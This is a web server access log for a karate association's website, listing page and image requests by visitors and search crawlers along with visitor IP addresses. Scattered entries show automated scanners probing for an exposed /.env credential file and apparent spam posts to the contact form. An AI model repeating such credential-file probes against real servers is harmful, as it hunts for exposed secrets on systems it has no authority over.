::ffff:136.24.141.37 - - [24/Aug/2022:04:25:34 +0000] "GET /images/marin5thDan.jpeg HTTP/1.1" 304 - "https://wadokikai.org/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36"
::ffff:136.24.141.37 - - [24/Aug/2022:04:25:34 +0000] "GET /images/schools/alamedakaratedomap.jpg HTTP/1.1" 304 - "https://wadokikai.org/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36"
::ffff:136.24.141.37 - - [24/Aug/2022:04:25:34 +0000] "GET /images/schools/orindakaratedomap.jpg HTTP/1.1" 304 - "https://wadokikai.org/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36"
::ffff:136.24.141.37 - - [24/Aug/2022:04:25:34 +0000] "GET /images/schools/dcakaratedomap.jpg HTTP/1.1" 304 - "https://wadokikai.org/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36"
::ffff:136.24.141.37 - - [24/Aug/2022:04:25:34 +0000] "GET /images/schools/harborbaykaratedomap.jpg HTTP/1.1" 304 - "https://wadokikai.org/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36"
::ffff:136.24.141.37 - - [24/Aug/2022:04:25:34 +0000] "GET /images/schools/corpuzkaratedomap.jpg HTTP/1.1" 304 - "https://wadokikai.org/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36"
::ffff:136.24.141.37 - - [24/Aug/2022:04:25:34 +0000] "GET /images/schools/nunleykaratedomap.jpg HTTP/1.1" 304 - "https://wadokikai.org/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36"
::ffff:136.24.141.37 - - [24/Aug/2022:04:25:34 +0000] "GET /images/schools/marinkaratedomap.jpg HTTP/1.1" 304 - "https://wadokikai.org/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36"
::ffff:136.24.141.37 - - [24/Aug/2022:04:25:34 +0000] "GET /images/schools/earhartkaratedomap.jpg HTTP/1.1" 304 - "https://wadokikai.org/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36"
::ffff:136.24.141.37 - - [24/Aug/2022:04:25:34 +0000] "GET /images/schools/martinezkaratedomap.jpg HTTP/1.1" 304 - "https://wadokikai.org/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36"
::ffff:136.24.141.37 - - [24/Aug/2022:04:25:34 +0000] "GET /images/schools/manzanitakaratedomap.jpg HTTP/1.1" 304 - "https://wadokikai.org/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36"
::ffff:136.24.141.37 - - [24/Aug/2022:04:25:34 +0000] "GET /images/dragon-trans.png HTTP/1.1" 304 - "https://wadokikai.org/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36"
::ffff:136.24.141.37 - - [24/Aug/2022:04:25:38 +0000] "GET /images/tiger.bmp HTTP/1.1" 304 - "https://wadokikai.org/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36"
::ffff:136.24.141.37 - - [24/Aug/2022:04:25:41 +0000] "GET /images/wadokikai%20kanji.jpg HTTP/1.1" 304 - "https://wadokikai.org/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36"
::ffff:136.24.141.37 - - [24/Aug/2022:04:25:45 +0000] "GET /images/dragon-trans.png HTTP/1.1" 304 - "https://wadokikai.org/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36"
::ffff:136.24.141.37 - - [24/Aug/2022:04:25:48 +0000] "GET /images/tiger.bmp HTTP/1.1" 200 311274 "https://wadokikai.org/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36"
::ffff:66.249.66.195 - - [24/Aug/2022:04:31:36 +0000] "GET /images/schools/orindakaratedomap.jpg HTTP/1.1" 304 - "-" "Googlebot-Image/1.0"
::ffff:66.249.66.199 - - [24/Aug/2022:04:34:00 +0000] "GET /terminology.php HTTP/1.1" 404 154 "-" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.79 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
::ffff:185.254.196.115 - - [24/Aug/2022:04:38:26 +0000] "GET /.env HTTP/1.1" 404 143 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:185.254.196.115 - - [24/Aug/2022:04:38:26 +0000] "POST / HTTP/1.1" 404 140 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:66.249.66.56 - - [24/Aug/2022:04:38:35 +0000] "GET /contact2.html HTTP/1.1" 404 152 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
::ffff:143.92.32.136 - - [24/Aug/2022:04:41:53 +0000] "GET / HTTP/1.1" 200 58158 "-" "<title>(.*?)<\/title>"
::ffff:46.161.11.238 - - [24/Aug/2022:04:50:03 +0000] "GET / HTTP/1.0" 200 58158 "http://wadokikai.org/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4100.3 Safari/537.36"
::ffff:46.161.11.238 - - [24/Aug/2022:04:50:04 +0000] "POST /sendemail HTTP/1.0" 302 40 "http://wadokikai.org/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4100.3 Safari/537.36"
::ffff:46.161.11.238 - - [24/Aug/2022:04:50:04 +0000] "GET /?err=error HTTP/1.0" 200 58710 "http://wadokikai.org/?err=error#signup" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4100.3 Safari/537.36"
::ffff:114.119.152.119 - - [24/Aug/2022:04:52:46 +0000] "GET / HTTP/1.1" 200 58158 "http://www.wadokikai.org/events" "Mozilla/5.0 (Linux; Android 7.0;) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36 (compatible; PetalBot;+https://webmaster.petalsearch.com/site/petalbot)"
::ffff:183.136.225.35 - - [24/Aug/2022:04:53:57 +0000] "GET / HTTP/1.1" 200 58158 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:47.0) Gecko/20100101 Firefox/47.0"
::ffff:183.136.225.35 - - [24/Aug/2022:04:54:48 +0000] "GET / HTTP/1.1" 200 58158 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36 QIHU 360SE"
::ffff:183.136.225.35 - - [24/Aug/2022:04:56:03 +0000] "GET /robots.txt HTTP/1.1" 404 149 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36 QIHU 360SE"
::ffff:207.46.13.188 - - [24/Aug/2022:04:58:57 +0000] "GET /resources HTTP/1.1" 200 194906 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
::ffff:66.249.66.52 - - [24/Aug/2022:05:01:36 +0000] "GET /images/schools/orindakaratedomap.jpg HTTP/1.1" 200 34167 "-" "Googlebot-Image/1.0"
::ffff:67.160.201.88 - - [24/Aug/2022:05:04:12 +0000] "GET /favicon.ico HTTP/1.1" 404 150 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 15_6_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) FxiOS/40.2  Mobile/15E148 Safari/605.1.15"
::ffff:67.160.201.88 - - [24/Aug/2022:05:04:13 +0000] "GET /favicon.ico HTTP/1.1" 404 150 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 15_6_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) FxiOS/40.2  Mobile/15E148 Safari/605.1.15"
::ffff:67.160.201.88 - - [24/Aug/2022:05:04:17 +0000] "GET /favicon.ico HTTP/1.1" 404 150 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 15_6_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) FxiOS/40.2  Mobile/15E148 Safari/605.1.15"
::ffff:67.160.201.88 - - [24/Aug/2022:05:04:17 +0000] "GET /favicon.ico HTTP/1.1" 404 150 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 15_6_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) FxiOS/40.2  Mobile/15E148 Safari/605.1.15"
::ffff:67.160.201.88 - - [24/Aug/2022:05:04:18 +0000] "GET /favicon.ico HTTP/1.1" 404 150 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 15_6_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) FxiOS/40.2  Mobile/15E148 Safari/605.1.15"
::ffff:67.160.201.88 - - [24/Aug/2022:05:04:18 +0000] "GET /favicon.ico HTTP/1.1" 404 150 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 15_6_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) FxiOS/40.2  Mobile/15E148 Safari/605.1.15"
::ffff:67.160.201.88 - - [24/Aug/2022:05:04:19 +0000] "GET /favicon.ico HTTP/1.1" 404 150 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 15_6_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) FxiOS/40.2  Mobile/15E148 Safari/605.1.15"
::ffff:67.160.201.88 - - [24/Aug/2022:05:04:22 +0000] "GET /favicon.ico HTTP/1.1" 404 150 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 15_6_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) FxiOS/40.2  Mobile/15E148 Safari/605.1.15"
::ffff:67.160.201.88 - - [24/Aug/2022:05:04:22 +0000] "GET /favicon.ico HTTP/1.1" 404 150 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 15_6_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) FxiOS/40.2  Mobile/15E148 Safari/605.1.15"
::ffff:67.160.201.88 - - [24/Aug/2022:05:04:23 +0000] "GET /favicon.ico HTTP/1.1" 404 150 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 15_6_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) FxiOS/40.2  Mobile/15E148 Safari/605.1.15"
::ffff:67.160.201.88 - - [24/Aug/2022:05:04:23 +0000] "GET /favicon.ico HTTP/1.1" 404 150 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 15_6_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) FxiOS/40.2  Mobile/15E148 Safari/605.1.15"
::ffff:67.160.201.88 - - [24/Aug/2022:05:04:24 +0000] "GET /favicon.ico HTTP/1.1" 404 150 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 15_6_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) FxiOS/40.2  Mobile/15E148 Safari/605.1.15"
::ffff:136.24.141.37 - - [24/Aug/2022:05:10:07 +0000] "GET /images/dragon-trans.png HTTP/1.1" 304 - "https://wadokikai.org/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36"
::ffff:136.24.141.37 - - [24/Aug/2022:05:10:11 +0000] "GET /images/tiger.bmp HTTP/1.1" 304 - "https://wadokikai.org/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36"
::ffff:135.125.244.48 - - [24/Aug/2022:05:14:10 +0000] "POST / HTTP/1.1" 404 140 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:135.125.244.48 - - [24/Aug/2022:05:14:10 +0000] "GET /.env HTTP/1.1" 404 143 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:3.135.241.91 - - [24/Aug/2022:05:15:19 +0000] "GET /images/tiger.bmp HTTP/1.1" 304 - "http://wadokikai.org/" "Mozilla/5.0 (iPhone; CPU iPhone OS 15_6_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.6.1 Mobile/15E148 Safari/604.1"
::ffff:3.135.241.91 - - [24/Aug/2022:05:15:23 +0000] "GET /images/wadokikai%20kanji.jpg HTTP/1.1" 304 - "http://wadokikai.org/" "Mozilla/5.0 (iPhone; CPU iPhone OS 15_6_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.6.1 Mobile/15E148 Safari/604.1"
::ffff:34.77.127.183 - - [24/Aug/2022:05:21:29 +0000] "GET / HTTP/1.1" 200 58158 "-" "python-requests/2.28.1"
::ffff:46.161.11.227 - - [24/Aug/2022:05:24:56 +0000] "GET / HTTP/1.0" 200 58158 "http://wadokikai.net/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4087.0 Safari/537.36"
::ffff:46.161.11.227 - - [24/Aug/2022:05:24:57 +0000] "POST /sendemail HTTP/1.0" 302 40 "http://wadokikai.net/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4087.0 Safari/537.36"
::ffff:46.161.11.227 - - [24/Aug/2022:05:24:57 +0000] "GET /?err=error HTTP/1.0" 200 58710 "http://wadokikai.net/?err=error#signup" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4087.0 Safari/537.36"
::ffff:66.249.66.52 - - [24/Aug/2022:05:27:34 +0000] "GET /resources HTTP/1.1" 200 194906 "-" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.79 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
::ffff:207.46.13.168 - - [24/Aug/2022:05:30:43 +0000] "GET /index.php HTTP/1.1" 404 148 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
::ffff:114.119.145.205 - - [24/Aug/2022:05:31:34 +0000] "GET /contact?s=1&ss=6 HTTP/1.1" 200 9997 "http://34.212.47.6/" "Mozilla/5.0 (Linux; Android 7.0;) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36 (compatible; PetalBot;+https://webmaster.petalsearch.com/site/petalbot)"
::ffff:66.249.66.195 - - [24/Aug/2022:05:31:36 +0000] "GET /images/arrow.gif HTTP/1.1" 404 155 "-" "Googlebot-Image/1.0"
::ffff:66.249.66.195 - - [24/Aug/2022:05:38:37 +0000] "GET /videos.php HTTP/1.1" 404 149 "-" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.101 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
::ffff:207.46.13.168 - - [24/Aug/2022:05:44:06 +0000] "GET /index.php HTTP/1.1" 404 148 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
::ffff:54.36.148.154 - - [24/Aug/2022:05:47:25 +0000] "GET /robots.txt HTTP/1.1" 404 149 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
::ffff:51.222.253.20 - - [24/Aug/2022:05:47:26 +0000] "GET / HTTP/1.1" 200 58158 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
::ffff:104.132.216.93 - - [24/Aug/2022:05:56:06 +0000] "GET / HTTP/1.1" 200 58158 "-" "Mozilla/5.0 (X11; CrOS x86_64 14909.100.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36"
::ffff:104.132.216.93 - - [24/Aug/2022:05:56:07 +0000] "GET /css/wadokikai.css HTTP/1.1" 200 4337 "https://wadokikai.org/" "Mozilla/5.0 (X11; CrOS x86_64 14909.100.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36"
::ffff:104.132.216.93 - - [24/Aug/2022:05:56:07 +0000] "GET /images/wkkpatch22_med.png HTTP/1.1" 200 32301 "https://wadokikai.org/" "Mozilla/5.0 (X11; CrOS x86_64 14909.100.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36"
::ffff:104.132.216.93 - - [24/Aug/2022:05:56:07 +0000] "GET /images/promotions/20220728corpuz.jpg HTTP/1.1" 200 108218 "https://wadokikai.org/" "Mozilla/5.0 (X11; CrOS x86_64 14909.100.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36"
::ffff:104.132.216.93 - - [24/Aug/2022:05:56:07 +0000] "GET /js/common.js HTTP/1.1" 200 2255 "https://wadokikai.org/" "Mozilla/5.0 (X11; CrOS x86_64 14909.100.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36"
::ffff:104.132.216.93 - - [24/Aug/2022:05:56:07 +0000] "GET /images/tournaments/NKD8202022.jpg HTTP/1.1" 200 493189 "https://wadokikai.org/" "Mozilla/5.0 (X11; CrOS x86_64 14909.100.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36"
::ffff:104.132.216.93 - - [24/Aug/2022:05:56:08 +0000] "GET /images/marin5thDan.jpeg HTTP/1.1" 200 105451 "https://wadokikai.org/" "Mozilla/5.0 (X11; CrOS x86_64 14909.100.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36"
::ffff:104.132.216.93 - - [24/Aug/2022:05:56:08 +0000] "GET /images/schools/alamedakaratedomap.jpg HTTP/1.1" 200 38311 "https://wadokikai.org/" "Mozilla/5.0 (X11; CrOS x86_64 14909.100.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36"
::ffff:104.132.216.93 - - [24/Aug/2022:05:56:08 +0000] "GET /images/schools/orindakaratedomap.jpg HTTP/1.1" 200 34167 "https://wadokikai.org/" "Mozilla/5.0 (X11; CrOS x86_64 14909.100.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36"
::ffff:104.132.216.93 - - [24/Aug/2022:05:56:08 +0000] "GET /images/schools/dcakaratedomap.jpg HTTP/1.1" 200 35262 "https://wadokikai.org/" "Mozilla/5.0 (X11; CrOS x86_64 14909.100.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36"
::ffff:104.132.216.93 - - [24/Aug/2022:05:56:08 +0000] "GET /images/schools/harborbaykaratedomap.jpg HTTP/1.1" 200 37245 "https://wadokikai.org/" "Mozilla/5.0 (X11; CrOS x86_64 14909.100.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36"
::ffff:104.132.216.93 - - [24/Aug/2022:05:56:08 +0000] "GET /images/schools/corpuzkaratedomap.jpg HTTP/1.1" 200 36421 "https://wadokikai.org/" "Mozilla/5.0 (X11; CrOS x86_64 14909.100.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36"
::ffff:104.132.216.93 - - [24/Aug/2022:05:56:08 +0000] "GET /images/schools/nunleykaratedomap.jpg HTTP/1.1" 200 42667 "https://wadokikai.org/" "Mozilla/5.0 (X11; CrOS x86_64 14909.100.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36"
::ffff:104.132.216.93 - - [24/Aug/2022:05:56:08 +0000] "GET /images/schools/marinkaratedomap.jpg HTTP/1.1" 200 32400 "https://wadokikai.org/" "Mozilla/5.0 (X11; CrOS x86_64 14909.100.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36"
::ffff:104.132.216.93 - - [24/Aug/2022:05:56:08 +0000] "GET /images/schools/earhartkaratedomap.jpg HTTP/1.1" 200 41366 "https://wadokikai.org/" "Mozilla/5.0 (X11; CrOS x86_64 14909.100.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36"
::ffff:104.132.216.93 - - [24/Aug/2022:05:56:09 +0000] "GET /images/schools/martinezkaratedomap.jpg HTTP/1.1" 200 37724 "https://wadokikai.org/" "Mozilla/5.0 (X11; CrOS x86_64 14909.100.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36"
::ffff:104.132.216.93 - - [24/Aug/2022:05:56:09 +0000] "GET /images/schools/manzanitakaratedomap.jpg HTTP/1.1" 200 55402 "https://wadokikai.org/" "Mozilla/5.0 (X11; CrOS x86_64 14909.100.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36"
::ffff:104.132.216.93 - - [24/Aug/2022:05:56:09 +0000] "GET /images/dragon-trans.png HTTP/1.1" 200 85661 "https://wadokikai.org/" "Mozilla/5.0 (X11; CrOS x86_64 14909.100.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36"
::ffff:104.132.216.93 - - [24/Aug/2022:05:56:09 +0000] "GET /images/favicon.ico HTTP/1.1" 200 3638 "https://wadokikai.org/" "Mozilla/5.0 (X11; CrOS x86_64 14909.100.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36"
::ffff:104.132.216.93 - - [24/Aug/2022:05:56:13 +0000] "GET /images/tiger.bmp HTTP/1.1" 200 311274 "https://wadokikai.org/" "Mozilla/5.0 (X11; CrOS x86_64 14909.100.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36"
::ffff:104.132.216.93 - - [24/Aug/2022:05:56:16 +0000] "GET /images/wadokikai%20kanji.jpg HTTP/1.1" 200 35066 "https://wadokikai.org/" "Mozilla/5.0 (X11; CrOS x86_64 14909.100.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36"
::ffff:104.132.216.93 - - [24/Aug/2022:05:56:20 +0000] "GET /images/dragon-trans.png HTTP/1.1" 304 - "https://wadokikai.org/" "Mozilla/5.0 (X11; CrOS x86_64 14909.100.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36"
::ffff:104.132.216.93 - - [24/Aug/2022:05:56:23 +0000] "GET /images/tiger.bmp HTTP/1.1" 304 - "https://wadokikai.org/" "Mozilla/5.0 (X11; CrOS x86_64 14909.100.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36"
::ffff:157.55.39.26 - - [24/Aug/2022:05:59:17 +0000] "GET /docs/twenty%20guiding%20principles%20of%20karate.pdf HTTP/1.1" 404 191 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
::ffff:67.160.201.88 - - [24/Aug/2022:06:07:03 +0000] "GET /favicon.ico HTTP/1.1" 404 150 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 15_6_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) FxiOS/40.2  Mobile/15E148 Safari/605.1.15"
::ffff:67.160.201.88 - - [24/Aug/2022:06:07:03 +0000] "GET /favicon.ico HTTP/1.1" 404 150 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 15_6_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) FxiOS/40.2  Mobile/15E148 Safari/605.1.15"
::ffff:185.254.196.115 - - [24/Aug/2022:06:08:37 +0000] "GET /.env HTTP/1.1" 404 143 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:185.254.196.115 - - [24/Aug/2022:06:08:37 +0000] "POST / HTTP/1.1" 404 140 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:157.55.39.54 - - [24/Aug/2022:06:15:09 +0000] "GET /robots.txt HTTP/1.1" 404 149 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
::ffff:207.46.13.113 - - [24/Aug/2022:06:15:13 +0000] "GET /katas.html HTTP/1.1" 404 149 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
::ffff:66.249.66.199 - - [24/Aug/2022:06:21:08 +0000] "GET /signup.html HTTP/1.1" 404 150 "-" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.79 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
::ffff:157.55.39.86 - - [24/Aug/2022:06:22:15 +0000] "GET / HTTP/1.1" 200 58158 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
::ffff:207.46.13.143 - - [24/Aug/2022:06:22:15 +0000] "GET /contact?s=1&ss=7 HTTP/1.1" 200 9997 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
::ffff:207.46.13.143 - - [24/Aug/2022:06:22:26 +0000] "GET /contact HTTP/1.1" 200 10017 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
::ffff:51.222.253.17 - - [24/Aug/2022:06:26:04 +0000] "GET /contact?s=1&ss=11 HTTP/1.1" 200 9997 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
::ffff:207.46.13.113 - - [24/Aug/2022:06:27:05 +0000] "GET /katas.html HTTP/1.1" 404 149 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
::ffff:106.75.81.218 - - [24/Aug/2022:06:27:15 +0000] "GET / HTTP/1.1" 200 58158 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/48.0.2564.116 Safari/537.36 TheWorld 7"
::ffff:106.75.81.218 - - [24/Aug/2022:06:27:18 +0000] "GET /images/favicon.ico HTTP/1.1" 200 3638 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/48.0.2564.116 Safari/537.36 TheWorld 7"
::ffff:106.75.81.218 - - [24/Aug/2022:06:27:19 +0000] "GET /js/common.js HTTP/1.1" 200 2255 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/48.0.2564.116 Safari/537.36 TheWorld 7"
::ffff:106.75.81.218 - - [24/Aug/2022:06:27:31 +0000] "GET /robots.txt HTTP/1.1" 404 149 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/48.0.2564.116 Safari/537.36 TheWorld 7"
::ffff:106.75.81.218 - - [24/Aug/2022:06:27:31 +0000] "GET /sitemap.xml HTTP/1.1" 404 150 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/48.0.2564.116 Safari/537.36 TheWorld 7"
::ffff:40.77.167.22 - - [24/Aug/2022:06:32:47 +0000] "GET /contact HTTP/1.1" 200 10017 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
::ffff:178.79.131.5 - - [24/Aug/2022:06:39:29 +0000] "GET / HTTP/1.1" 200 58158 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:8.0) Gecko/20100101 Firefox/8.0"
